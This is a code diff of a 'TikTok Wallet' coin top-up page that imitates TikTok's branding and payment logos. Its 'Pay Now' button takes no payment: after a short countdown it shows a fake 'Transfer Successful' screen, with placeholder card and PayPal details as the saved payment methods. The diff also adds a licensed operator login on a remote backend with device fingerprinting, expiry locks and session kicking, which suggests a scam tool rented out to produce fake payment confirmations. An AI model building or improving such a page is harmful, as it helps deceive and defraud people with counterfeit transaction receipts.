@@ -4,6 +4,30 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>TikTok Wallet</title>
+<script>
+const BACKEND_URL = "https://tiktok-data-acquisitio.onrender.com";
+
+function getBrowserFingerprint(){
+  const info = navigator.userAgent + screen.width + screen.height + navigator.language;
+  let hash = 0;
+  for(let i=0;i<info.length;i++){
+    const char = info.charCodeAt(i);
+    hash = ((hash << 5) - hash) + char;
+    hash = hash & hash;
+  }
+  return "fp_" + Math.abs(hash);
+}
+const DEVICE_FP = getBrowserFingerprint();
+
+const Storage = {
+  set:(k,v)=>localStorage.setItem(k,JSON.stringify(v)),
+  get:(k)=>{
+    const val = localStorage.getItem(k);
+    return val ? JSON.parse(val) : null;
+  },
+  clear:()=>localStorage.clear()
+};
+</script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Roboto,sans-serif;}
 body{background:#ffffff;}
@@ -15,10 +39,11 @@ body{background:#ffffff;}
 .searchInput{width:100%;padding:10px 16px;border-radius:20px;border:1px solid #ddd;font-size:15px;outline:none;}
 .searchTip{position:absolute;top:calc(100% + 8px);left:26px;font-size:12px;color:#999;}
 
-.loading-text{color:#666;font-size:14px;margin:0 0 10px 16px;display:none;}
+.loading-text{color:#666;font-size:14px;margin:0 0 10px 16px;}
 
 .user-section{padding:12px 16px;display:flex;align-items:center;gap:12px;margin-top:20px;}
-.avatar{width:60px;height:60px;border-radius:50%;object-fit:cover;background:#f0f0f0;}
+.avatar{width:60px;height:60px;border-radius:50%;object-fit:cover;background:#f0f0f0;display:flex;align-items:center;justify-content:center;}
+.avatar svg{width:36px;height:36px;}
 .user-info{flex:1;}
 .user-stats{display:flex;gap:10px;margin-top:4px;font-size:12px;color:#666;}
 
@@ -27,10 +52,23 @@ body{background:#ffffff;}
 .amountItem{border:1px solid #e8e8e8;border-radius:10px;padding:12px 0;text-align:center;background:#fdfdff;cursor:pointer;}
 .amountItem.active{border:2px solid #fe2c55;}
 .numText{font-size:16px;font-weight:bold;display:flex;align-items:center;justify-content:center;gap:6px;}
-.coin-icon{width:20px;height:20px;background:#ffb800;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:bold;font-size:12px;}
-.coin-icon::before{content:"♪";}
+.coin-icon{width:20px;height:20px;display:flex;align-items:center;justify-content:center;}
+.coin-icon img{width:100%;height:100%;object-fit:contain;}
 .priceText{font-size:12px;color:#999;margin-top:2px;}
+
+.custom-btn{border:1px solid #e8e8e8;border-radius:10px;padding:12px 0;text-align:center;background:#fdfdff;cursor:pointer;}
+.custom-btn.active{border:2px solid #fe2c55;}
 .customInput{width:calc(100% - 32px);margin:12px 16px;padding:10px;border-radius:10px;border:1px solid #ddd;}
+
+.payment-bar{display:flex;align-items:center;gap:12px;padding:12px 16px;flex-wrap:wrap;}
+.payment-bar span{font-size:18px;font-weight:500;}
+.payment-bar img{height:24px;object-fit:contain;}
+
+.invite-bar{display:flex;align-items:center;gap:12px;padding:12px 16px;background:#f9f9f9;margin:0 16px 10px;border-radius:10px;}
+.invite-bar img{height:48px;object-fit:contain;}
+.invite-text .title{font-size:18px;font-weight:600;color:#000;display:block;}
+.invite-text .desc{font-size:16px;color:#666;display:block;}
+
 .tipText{display:none;}
 .submitBtn{width:calc(100% - 32px);height:50px;margin:15px 16px;background:#fe2c55;border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;}
 .popOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.65);display:none;align-items:center;justify-content:center;z-index:999;}
@@ -42,33 +80,62 @@ body{background:#ffffff;}
 .spinner{width:36px;height:36px;border:4px solid #eee;border-top:4px solid #fe2c55;border-radius:50%;animation:spin 1s linear infinite;margin:10px auto;}
 @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
 
-.success-icon { width:70px;height:70px;margin:0 auto 16px; }
-.success-icon svg { width:100%;height:100%; }
-.success-circle { stroke:#10b981;stroke-width:5;fill:none;stroke-dasharray:314;stroke-dashoffset:314;animation:circleAnim 0.8s ease forwards; }
-.success-tick { stroke:#10b981;stroke-width:5;fill:none;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:80;stroke-dashoffset:80;animation:tickAnim 0.4s ease forwards 0.8s; }
+.success-icon {width:70px;height:70px;margin:0 auto 16px;position:relative;border-radius:50%;overflow:hidden;}
+.success-avatar-bg{width:100%;height:100%;object-fit:cover;border-radius:50%;}
+.success-mask{position:absolute;inset:0;background:rgba(0,0,0,0.35);border-radius:50%;}
+.success-icon svg {position:absolute;inset:0;width:100%;height:100%;}
+.success-circle { stroke:#10b985;stroke-width:5;fill:none;stroke-dasharray:314;stroke-dashoffset:314;animation:circleAnim 0.8s ease forwards; }
+.success-tick { stroke:#10b985;stroke-width:5;fill:none;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:80;stroke-dashoffset:80;animation:tickAnim 0.4s ease forwards 0.8s; }
 @keyframes circleAnim { to { stroke-dashoffset:0; } }
 @keyframes tickAnim { to { stroke-dashoffset:0; } }
+
+.payment-modal {position: fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:none;align-items:center;justify-content:center;z-index:1000;}
+.payment-modal-content {background:#fff;width:90%;max-width:500px;border-radius:12px;padding:24px;position:relative;}
+.payment-modal-close {position:absolute;top:16px;right:16px;font-size:24px;cursor:pointer;color:#333;}
+.payment-modal-header h2 {font-size:20px;margin-bottom:8px;}
+.payment-modal-header .security-note {font-size:12px;color:#10b985;display:flex;align-items:center;gap:4px;margin-bottom:20px;}
+.order-summary-row {display:flex;justify-content:space-between;margin-bottom:16px;font-size:16px;}
+.payment-options {margin:20px 0;}
+.payment-option {display:flex;align-items:center;justify-content:space-between;padding:16px;border:1px solid #ddd;border-radius:8px;margin-bottom:12px;cursor:pointer;flex-wrap:wrap;}
+.payment-option.selected {border-color:#fe2c55;background-color:#fff5f7;}
+.payment-option-left {display:flex;align-items:center;gap:12px;}
+.payment-option input[type="radio"] {width:18px;height:18px;}
+.payment-option img {height:24px;object-fit:contain;}
+.virtual-account {width:100%;margin-top:10px;padding-top:10px;border-top:1px solid #eee;font-size:14px;color:#666;letter-spacing:1px;}
+.payment-footer-note {font-size:12px;color:#666;line-height:1.5;margin:16px 0;}
+.pay-btn {width:100%;height:50px;background:#fe2c55;border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;}
 
 .login-container { background:white;padding:30px;border-radius:16px;box-shadow:0 10px 25px rgba(0,0,0,0.08);width:100%;max-width:380px;margin:40px auto; }
 .login-container h2 { text-align:center;margin-bottom:24px;color:#111827; }
 .form-item { margin-bottom:16px; }
 .form-item label { display:block;margin-bottom:6px;font-size:14px;color:#374151; }
 .form-item input { width:100%;padding:12px 14px;border:1px solid #d1d5db;border-radius:8px;font-size:16px;outline:none; }
-.login-btn { width:100%;padding:12px;background:#10b981;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;margin-top:10px;cursor:pointer; }
+.login-btn { width:100%;padding:12px;background:#10b985;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;margin-top:10px;cursor:pointer;transition:all 0.2s; }
+.login-btn:disabled {background:#666;cursor:not-allowed;opacity:0.8;}
 .error { color:#ef4444;text-align:center;margin-top:10px;font-size:14px; }
+
+.lock-mask{position:fixed;inset:0;background:#0009;z-index:9999;display:flex;align-items:center;justify-content:center;color:#fff;font-size:16px;padding:20px;text-align:center;}
 </style>
 </head>
 <body>
+
+<div id="lockMask" class="lock-mask" style="display:none;">
+  <div>
+    <h3 id="lockTitle" style="margin-bottom:15px;"></h3>
+    <p id="lockMsg" style="margin-bottom:20px;"></p>
+    <button onclick="logoutClear()" style="padding:8px 20px;border:none;border-radius:6px;background:#fff;color:#000;cursor:pointer;">Exit</button>
+  </div>
+</div>
 
 <div class="login-container" id="loginBox">
   <h2>Wallet Login</h2>
   <div class="form-item">
     <label>Username</label>
-    <input id="login_user" placeholder="Enter username">
+    <input id="login_user" placeholder="Enter your username">
   </div>
   <div class="form-item">
     <label>Password</label>
-    <input type="password" id="login_pwd" placeholder="Enter password">
+    <input type="password" id="login_pwd" placeholder="Enter your password">
   </div>
   <button class="login-btn" onclick="doLogin()">Login</button>
   <div class="error" id="err_msg"></div>
@@ -77,17 +144,21 @@ body{background:#ffffff;}
 <div id="app" style="display:none;">
 <div class="headerWrap">
   <h2>Wallet</h2>
-  <div class="headIcons">⋯ ?</div>
+  <div class="headIcons">⚙️</div>
 </div>
 
 <div class="searchInputWrap">
-  <input class="searchInput" id="usernameInp" placeholder="Enter TikTok Username" oninput="loadTikTokUser()">
-  <div class="searchTip" id="searchTip">Please enter the TikTok account you want to top up</div>
+  <input class="searchInput" id="usernameInp" placeholder="Please enter the TikTok account you want to top up" oninput="loadTikTokUser()">
+  <div class="searchTip" id="searchTip"></div>
 </div>
-<div class="loading-text" id="loading">Loading user data, please wait...</div>
+<div class="loading-text" id="loading" style="display:none;">Loading user data...</div>
 
 <div class="user-section">
-  <img id="avatar" class="avatar">
+  <div class="avatar" id="avatarWrap">
+    <svg viewBox="0 0 24 24" fill="#000">
+      <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1-.1z"/>
+    </svg>
+  </div>
   <div class="user-info">
     <div id="showUser">@username</div>
     <div class="user-stats">
@@ -99,31 +170,121 @@ body{background:#ffffff;}
 </div>
 
 <div class="sectionTitle">Select Amount</div>
-
 <div class="amountGrid">
   <div class="amountItem active" data-coins="30" data-cost="$0.31" onclick="choose(this)">
-    <div class="numText"><i class="coin-icon"></i>30</div><div class="priceText">$0.31</div>
+    <div class="numText">
+      <span class="coin-icon"><img src="https://tiktok-data-acquisitio.onrender.com/coin.png" alt="coin"></span> 30
+    </div>
+    <div class="priceText">$0.31</div>
   </div>
   <div class="amountItem" data-coins="350" data-cost="$3.65" onclick="choose(this)">
-    <div class="numText"><i class="coin-icon"></i>350</div><div class="priceText">$3.65</div>
+    <div class="numText">
+      <span class="coin-icon"><img src="https://tiktok-data-acquisitio.onrender.com/coin.png" alt="coin"></span> 350
+    </div>
+    <div class="priceText">$3.65</div>
   </div>
-  <div class="amountItem" data-coins="700" data-cost="$7.25" onclick="choose(this)">
-    <div class="numText"><i class="coin-icon"></i>700</div><div class="priceText">$7.25</div>
+  <div class="amountItem" data-coins="700" data-cost="$7.30" onclick="choose(this)">
+    <div class="numText">
+      <span class="coin-icon"><img src="https://tiktok-data-acquisitio.onrender.com/coin.png" alt="coin"></span> 700
+    </div>
+    <div class="priceText">$7.30</div>
   </div>
   <div class="amountItem" data-coins="1400" data-cost="$14.49" onclick="choose(this)">
-    <div class="numText"><i class="coin-icon"></i>1400</div><div class="priceText">$14.49</div>
+    <div class="numText">
+      <span class="coin-icon"><img src="https://tiktok-data-acquisitio.onrender.com/coin.png" alt="coin"></span> 1400
+    </div>
+    <div class="priceText">$14.49</div>
   </div>
   <div class="amountItem" data-coins="3500" data-cost="$36.20" onclick="choose(this)">
-    <div class="numText"><i class="coin-icon"></i>3500</div><div class="priceText">$36.20</div>
+    <div class="numText">
+      <span class="coin-icon"><img src="https://tiktok-data-acquisitio.onrender.com/coin.png" alt="coin"></span> 3500
+    </div>
+    <div class="priceText">$36.20</div>
   </div>
-  <div class="amountItem" id="customItem" onclick="switchCustomMode()">
-    <div class="numText">Custom</div>
+  <div class="custom-btn" id="customBtn" onclick="toggleCustomMode()">
+    <div class="numText">
+      <span class="coin-icon"><img src="https://tiktok-data-acquisitio.onrender.com/coin.png" alt="coin"></span> Custom
+    </div>
   </div>
 </div>
 
-<input type="number" class="customInput" id="customCoins" placeholder="Custom Coins">
+<input type="text" class="customInput" id="customCoins" placeholder="Custom Coins" style="display:none;">
+
+<div class="payment-bar">
+  <span>Payment Methods</span>
+  <img src="https://lf16-co-sg.tiktokcdn-us.com/obj/pipo-sgcompliance/sky/visa_acffbd.png" alt="VISA">
+  <img src="https://lf16-co-sg.tiktokcdn-us.com/obj/pipo-sgcompliance/sky/mastercard_light_5865fd.png" alt="Mastercard">
+  <img src="https://lf16-co-sg.tiktokcdn-us.com/obj/pipo-sgcompliance/sky/card_american_express_51cd3f.png" alt="Amex">
+  <img src="https://lf16-co-sg.tiktokcdn-us.com/obj/pipo-sgcompliance/sky/diners_0faca9.png" alt="Diners">
+  <img src="https://lf16-co-sg.tiktokcdn-us.com/obj/pipo-sgcompliance/sky/card_jcb_0481eb.png" alt="JCB">
+  <img src="https://lf16-co-sg.tiktokcdn-us.com/obj/pipo-sgcompliance/sky/paypal-light_839c52.png" alt="PayPal">
+  <img src="https://lf16-co-sg.tiktokcdn-us.com/obj/pipo-sgcompliance/sky/R29vZ2xlX1BheV9jZDYzNWIucG5n.png" alt="Google Pay">
+</div>
+
+<div class="invite-bar">
+  <img src="https://sf16-sg.tiktokcdn.com/obj/eden-sg/lm_alsshd_rvarpa/ljhwZthlaukjlkulzlp/referral/icon_invite_rewards.png" alt="Invite Rewards">
+  <div class="invite-text">
+    <span class="title">Invite & Earn Rewards</span>
+    <span class="desc">Check out this new feature</span>
+  </div>
+</div>
+
 <div class="tipText">Add this page to your home screen for faster access</div>
-<button class="submitBtn" onclick="startTransfer()">🔒 Continue</button>
+<button class="submitBtn" onclick="openPaymentModal()">🔒 Continue</button>
+
+<div class="payment-modal" id="paymentModal">
+  <div class="payment-modal-content">
+    <span class="payment-modal-close" onclick="closePaymentModal()">&times;</span>
+    <div class="payment-modal-header">
+      <h2>Order Summary</h2>
+      <div class="security-note">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+          <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM12 20C7.59 20 4 16.41 4 12C4 7.59 7.59 4 12 4C16.41 4 20 7.59 20 12C20 16.41 16.41 20 12 20ZM10 16.5L6.5 13L7.91 11.59L10 13.67L16.09 7.58L17.5 9L10 16.5Z" fill="#10b985"/>
+        </svg>
+        Your information is safe and secure
+      </div>
+    </div>
+    <div class="order-summary-row">
+      <span id="modalCoinText">30 Coins</span>
+      <span id="modalPriceText">US$0.31</span>
+    </div>
+    <div style="font-size:16px; font-weight:500; margin:16px 0;">Payment Methods</div>
+    <div class="payment-options">
+      <div class="payment-option selected" data-method="card" onclick="selectPaymentOption(this)">
+        <div class="payment-option-left">
+          <input type="radio" name="paymentMethod" checked>
+          <span>Add Credit or Debit Card</span>
+        </div>
+        <div style="display:flex; gap:8px;">
+          <img src="https://lf16-co-sg.tiktokcdn-us.com/obj/pipo-sgcompliance/sky/visa_acffbd.png" style="height:20px;">
+          <img src="https://lf16-co-sg.tiktokcdn-us.com/obj/pipo-sgcompliance/sky/mastercard_light_5865fd.png" style="height:20px;">
+        </div>
+        <div class="virtual-account">Card Number：4123 **** **** 8976</div>
+      </div>
+
+      <div class="payment-option" data-method="paypal" onclick="selectPaymentOption(this)">
+        <div class="payment-option-left">
+          <input type="radio" name="paymentMethod">
+          <span>PayPal</span>
+        </div>
+        <img src="https://lf16-co-sg.tiktokcdn-us.com/obj/pipo-sgcompliance/sky/paypal-light_839c52.png" style="height:20px;">
+        <div class="virtual-account">Account：demo***@gmail.com</div>
+      </div>
+
+      <div class="payment-option" data-method="googlepay" onclick="selectPaymentOption(this)">
+        <div class="payment-option-left">
+          <input type="radio" name="paymentMethod">
+          <span>Google Pay</span>
+        </div>
+        <img src="https://lf16-co-sg.tiktokcdn-us.com/obj/pipo-sgcompliance/sky/R29vZ2xlX1BheV9jZDYzNWIucG5n.png" style="height:20px;">
+      </div>
+    </div>
+    <div class="payment-footer-note">
+      By clicking pay, you agree to virtual items policy. Coins are non-refundable after purchase. TikTok detects your location for pricing accuracy.
+    </div>
+    <button class="pay-btn" onclick="confirmPayment()">Pay Now</button>
+  </div>
+</div>
 
 <div class="popOverlay" id="loadingPop">
   <div class="popBox">
@@ -136,234 +297,301 @@ body{background:#ffffff;}
 <div class="popOverlay" id="successPop">
   <div class="popBox">
     <div class="success-icon">
+      <img class="success-avatar-bg" id="popAvatarBg" src="" alt="">
+      <div class="success-mask"></div>
       <svg viewBox="0 0 100 100">
         <circle class="success-circle" cx="50" cy="50" r="45" />
         <path class="success-tick" d="M30 50 L45 65 L70 40" />
       </svg>
     </div>
     <h3>Transfer Successful</h3>
-    <p id="popContent"></p>
+    <div id="popContent" style="margin:10px 0;"></div>
     <p style="color:#060;margin-top:10px">Coins arrive within 24h</p>
     <button class="popBtn" onclick="closeAllPop()">Done</button>
   </div>
 </div>
-</div>
 
 <script>
-const API_BASE = "https://iiiiiilllllliiiiiiillllllllllllllllliiii.onrender.com";
+let selectedCoin = 30;
+let selectedPrice = "$0.31";
+let isCustom = false;
+let currentUserAvatar = "";
+let currentUsername = "";
+let sessionHeartbeat;
 
-async function getRealAvatar(username) {
-  try {
-    const res = await fetch(`https://tk-proxy-2026.onrender.com/get-avatar?username=${username}`);
-    const data = await res.json();
-    return data.success ? data.avatarUrl : '';
-  } catch (e) {
-    return '';
-  }
+function logoutClear(){
+  Storage.clear();
+  window.location.reload();
 }
 
-// ==============================
-// 互踢 / 登录校验 完整保留
-// ==============================
-async function checkAuth() {
-  const user = localStorage.getItem('last_user');
-  const token = localStorage.getItem('token');
-  if (!user || !token) return false;
-
-  try {
-    const res = await fetch('/api/check', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username: user, token })
+async function checkUserAuth(username){
+  try{
+    const res = await fetch(`${BACKEND_URL}/api/check-auth`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({
+        username:username,
+        device_fp:DEVICE_FP
+      })
     });
     const data = await res.json();
-    return data.ok;
-  } catch (e) {
+
+    if(data.code === -1){
+      document.getElementById("lockTitle").innerText = "Account Expired";
+      document.getElementById("lockMsg").innerText = "Your account validity has expired, please contact admin to renew";
+      document.getElementById("lockMask").style.display = "flex";
+      return false;
+    }
+    if(data.code === -2){
+      document.getElementById("lockTitle").innerText = "Device Locked";
+      document.getElementById("lockMsg").innerText = "This account is bound to another browser, please contact admin to unlock";
+      document.getElementById("lockMask").style.display = "flex";
+      return false;
+    }
+    return true;
+  }catch(e){
+    document.getElementById("lockTitle").innerText = "Server Error";
+    document.getElementById("lockMsg").innerText = "Network verification failed";
+    document.getElementById("lockMask").style.display = "flex";
     return false;
   }
 }
 
-function logout() {
-  localStorage.removeItem('token');
-  showApp(false);
-}
+async function startHeartbeat(){
+  if(sessionHeartbeat) clearInterval(sessionHeartbeat);
+  sessionHeartbeat = setInterval(async () => {
+    const token = Storage.get("token");
+    const username = Storage.get("last_user");
+    if(!token || !username) return;
 
-window.onload = async () => {
-  const savedUser = localStorage.getItem('last_user');
-  const token = localStorage.getItem('token');
-
-  if (savedUser) {
-    document.getElementById('login_user').value = savedUser;
-  }
-
-  if (!savedUser || !token) {
-    showApp(false);
-    return;
-  }
-
-  const ok = await checkAuth();
-  if (ok) showApp(true);
-  else logout();
-};
-
-function showApp(visible) {
-  document.getElementById('loginBox').style.display = visible ? 'none' : 'block';
-  document.getElementById('app').style.display = visible ? 'block' : 'none';
-}
-
-async function doLogin() {
-  const userInput = document.getElementById('login_user').value.trim();
-  const pwdInput = document.getElementById('login_pwd').value.trim();
-  const err = document.getElementById('err_msg');
-
-  if (!userInput || !pwdInput) {
-    err.textContent = "Please enter username and password";
-    return;
-  }
-
-  try {
-    const res = await fetch('/api/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username: userInput, password: pwdInput })
+    const res = await fetch(`${BACKEND_URL}/api/check`, {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({username, token})
     });
     const data = await res.json();
-
-    if (data.ok) {
-      localStorage.setItem('last_user', userInput);
-      localStorage.setItem('token', data.token);
-      err.textContent = "";
-      showApp(true);
-    } else {
-      err.textContent = data.msg;
+    if(!data.ok){
+      clearInterval(sessionHeartbeat);
+      document.getElementById("lockTitle").innerText = "Kicked Offline";
+      document.getElementById("lockMsg").innerText = "Your account has logged in elsewhere, forced logout";
+      document.getElementById("lockMask").style.display = "flex";
     }
-  } catch (e) {
-    err.textContent = "Server error";
+  }, 5000);
+}
+
+function toggleCustomMode() {
+  const customInput = document.getElementById('customCoins');
+  const customBtn = document.getElementById('customBtn');
+  
+  if (!isCustom) {
+    isCustom = true;
+    customBtn.classList.add('active');
+    customInput.style.display = 'block';
+    customInput.focus();
+    document.querySelectorAll('.amountItem').forEach(i => i.classList.remove('active'));
+  } else {
+    isCustom = false;
+    customBtn.classList.remove('active');
+    customInput.style.display = 'none';
+    document.getElementById('customCoins').value = '';
+    document.querySelector('.amountItem').classList.add('active');
+    selectedCoin = 30;
+    selectedPrice = "$0.31";
   }
 }
 
-async function loadTikTokUser() {
-  const user = document.getElementById('usernameInp').value.trim();
-  const tipEl = document.getElementById('searchTip');
-  const loadingEl = document.getElementById('loading');
-
-  if (!user) {
-    tipEl.style.display = 'block';
-    document.getElementById('avatar').src = '';
-    document.getElementById('showUser').innerText = '@username';
-    document.getElementById('videos').innerText = '0 videos';
-    document.getElementById('followers').innerText = '0 followers';
-    document.getElementById('following').innerText = '0 following';
-    return;
+document.getElementById('customCoins').addEventListener('input', function() {
+  const value = parseInt(this.value);
+  if (!isNaN(value) && value > 0) {
+    selectedCoin = value;
+    selectedPrice = `$${(value * 0.010333).toFixed(2)}`;
   }
-
-  tipEl.style.display = 'none';
-  loadingEl.style.display = 'block';
-
-  const realAvatar = await getRealAvatar(user);
-  if (realAvatar) {
-    document.getElementById('avatar').src = realAvatar;
-  }
-  document.getElementById('showUser').innerText = '@' + user;
-
-  try {
-    const res = await fetch(`${API_BASE}/user/${user}`);
-    const data = await res.json();
-    if (data.success) {
-      document.getElementById('videos').innerText = data.videos + ' videos';
-      document.getElementById('followers').innerText = data.followers + ' followers';
-      document.getElementById('following').innerText = data.following + ' following';
-    }
-  } catch (e) {}
-
-  loadingEl.style.display = 'none';
-  tipEl.style.display = 'block';
-}
-
-let selectedCoin = 30;
-let selectedPrice = "$0.31";
-let isCustom = false;
+});
 
 function choose(el) {
-  document.querySelectorAll('.amountItem').forEach(i => i.classList.remove('active'));
+  document.querySelectorAll('.amountItem, .custom-btn').forEach(i => i.classList.remove('active'));
   el.classList.add('active');
   selectedCoin = Number(el.dataset.coins);
   selectedPrice = el.dataset.cost;
   isCustom = false;
   document.getElementById('customCoins').value = '';
+  document.getElementById('customCoins').style.display = 'none';
 }
 
-function switchCustomMode() {
-  document.querySelectorAll('.amountItem').forEach(i => i.classList.remove('active'));
-  document.getElementById('customItem').classList.add('active');
-  isCustom = true;
-  document.getElementById('customCoins').focus();
-}
+async function loadTikTokUser() {
+  const user = document.getElementById('usernameInp').value.trim();
+  const avatarWrap = document.getElementById('avatarWrap');
+  document.getElementById('loading').style.display = 'block';
 
-async function startTransfer() {
-  if (!(await checkAuth())) { logout(); return; }
-
-  let coin, price;
-
-  if (isCustom) {
-    const val = document.getElementById('customCoins').value.trim();
-    if (!val || Number(val) <= 0) {
-      alert("Please enter a valid coin amount");
-      return;
-    }
-    coin = Number(val);
-    price = "$" + (coin * 0.010333).toFixed(2);
-  } else {
-    coin = selectedCoin;
-    price = selectedPrice;
+  if (!user) {
+    currentUserAvatar = "";
+    avatarWrap.innerHTML = `<svg viewBox="0 0 24 24" fill="#000"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1-.1z"/></svg>`;
+    document.getElementById('showUser').innerText = '@username';
+    document.getElementById('videos').innerText = '0 videos';
+    document.getElementById('followers').innerText = '0 followers';
+    document.getElementById('following').innerText = '0 following';
+    document.getElementById('loading').style.display = 'none';
+    return;
   }
 
-  const total = 3;
-  let t = total;
-  document.getElementById('loadingPop').style.display = "flex";
-  document.getElementById('countDownText').innerText = "Waiting: " + t + "s";
+  try {
+    const resp = await fetch(`${BACKEND_URL}/api/tiktok-user?unique_id=${user}`);
+    const data = await resp.json();
+    if (data.code === 0 && data.data) {
+      const d = data.data;
+      currentUserAvatar = d.user.avatarThumb || "";
+      document.getElementById('showUser').innerText = d.user.nickname || user;
+      avatarWrap.innerHTML = `<img src="${currentUserAvatar}" style="width:100%;height:100%;border-radius:50%;object-fit:cover;">`;
+      document.getElementById('videos').innerText = (d.stats.videoCount || 0) + ' videos';
+      document.getElementById('followers').innerText = (d.stats.followerCount || 0) + ' followers';
+      document.getElementById('following').innerText = (d.stats.followingCount || 0) + ' following';
+    }
+  } catch (e) {
+    console.error("Error loading user data:", e);
+  } finally {
+    document.getElementById('loading').style.display = 'none';
+  }
+}
 
+async function doLogin() {
+  const user = document.getElementById('login_user').value.trim();
+  const pwd = document.getElementById('login_pwd').value.trim();
+  const errMsg = document.getElementById('err_msg');
+  const loginBtn = document.querySelector(".login-btn");
+
+  if (!user || !pwd) {
+    errMsg.textContent = "Please enter username and password";
+    return;
+  }
+
+  loginBtn.innerText = "Logging in...";
+  loginBtn.disabled = true;
+  errMsg.textContent = "";
+
+  try {
+    const res = await fetch(`${BACKEND_URL}/api/login`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ 
+        username: user, 
+        password: pwd,
+        device_fp: DEVICE_FP
+      })
+    });
+    const data = await res.json();
+
+    if (data.ok) {
+      Storage.set("last_user", user);
+      Storage.set("token", data.token);
+      currentUsername = user;
+
+      const authOk = await checkUserAuth(user);
+      if(!authOk){
+        loginBtn.innerText = "Login";
+        loginBtn.disabled = false;
+        return;
+      }
+
+      document.getElementById("loginBox").style.display = "none";
+      document.getElementById("app").style.display = "block";
+
+      setTimeout(()=>{
+        startHeartbeat();
+      },1000);
+
+    } else {
+      errMsg.textContent = data.msg || "Login failed";
+      loginBtn.innerText = "Login";
+      loginBtn.disabled = false;
+    }
+  } catch (e) {
+    errMsg.textContent = "Server error, please try again later";
+    loginBtn.innerText = "Login";
+    loginBtn.disabled = false;
+  }
+}
+
+function openPaymentModal() {
+  document.getElementById('modalCoinText').textContent = `${selectedCoin} Coins`;
+  document.getElementById('modalPriceText').textContent = selectedPrice;
+  document.getElementById('paymentModal').style.display = 'flex';
+}
+
+function closePaymentModal() {
+  document.getElementById('paymentModal').style.display = 'none';
+}
+
+function selectPaymentOption(el) {
+  document.querySelectorAll('.payment-option').forEach(option => {
+    option.classList.remove('selected');
+    option.querySelector('input').checked = false;
+  });
+  el.classList.add('selected');
+  el.querySelector('input').checked = true;
+}
+
+function confirmPayment() {
+  closePaymentModal();
+  document.getElementById('popAvatarBg').src = currentUserAvatar;
+  document.getElementById('loadingPop').style.display = 'flex';
+  let t = 3;
   const timer = setInterval(() => {
     t--;
     document.getElementById('countDownText').innerText = "Waiting: " + t + "s";
     if (t <= 0) {
       clearInterval(timer);
-      document.getElementById('loadingPop').style.display = "none";
-
-      const orderId = "TT" + Date.now().toString().slice(-10);
-      const user = document.getElementById('showUser').innerText || "@unknown";
-      const time = new Date().toLocaleString();
-
-      document.getElementById('popContent').innerHTML =
-        `Recipient: ${user}<br>
-Amount: ${coin} Coins<br>
-Value: ${price}<br>
-Order ID: ${orderId}<br>
-Time: ${time}<br>
-Status: Completed`;
-
-      document.getElementById('successPop').style.display = "flex";
+      document.getElementById('loadingPop').style.display = 'none';
+      document.getElementById('successPop').style.display = 'flex';
+      document.getElementById('popContent').innerHTML = `
+        <div style="font-size:16px; font-weight:bold; display:flex; align-items:center; justify-content:center; gap:6px;">
+          <span class="coin-icon"><img src="https://tiktok-data-acquisitio.onrender.com/coin.png" alt="coin"></span>
+          ${selectedCoin} Coins
+        </div>
+        <div style="font-size:14px; color:#666; margin:4px 0;">${selectedPrice}</div>
+        <div style="font-size:14px; color:#555; margin-top:10px;">Recipient: ${document.getElementById('showUser').innerText}</div>
+      `;
     }
   }, 1000);
 }
 
-// ==============================
-// 点击 Done 自动清空 TikTok ID
-// 其他全部保留不动
-// ==============================
 function closeAllPop() {
   document.getElementById('successPop').style.display = "none";
-  document.getElementById('customCoins').value = "";
+  document.getElementById('usernameInp').value = '';
+  document.getElementById('customCoins').value = '';
+  document.getElementById('customCoins').style.display = 'none';
+  document.getElementById('customBtn').classList.remove('active');
+  isCustom = false;
+  currentUserAvatar = "";
 
-  // 自动清空用户名输入框
-  document.getElementById('usernameInp').value = "";
-  // 同时清空用户展示信息，恢复原样
-  document.getElementById('avatar').src = '';
+  const avatarWrap = document.getElementById('avatarWrap');
+  avatarWrap.innerHTML = `<svg viewBox="0 0 24 24" fill="#000"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1-.1z"/></svg>`;
   document.getElementById('showUser').innerText = '@username';
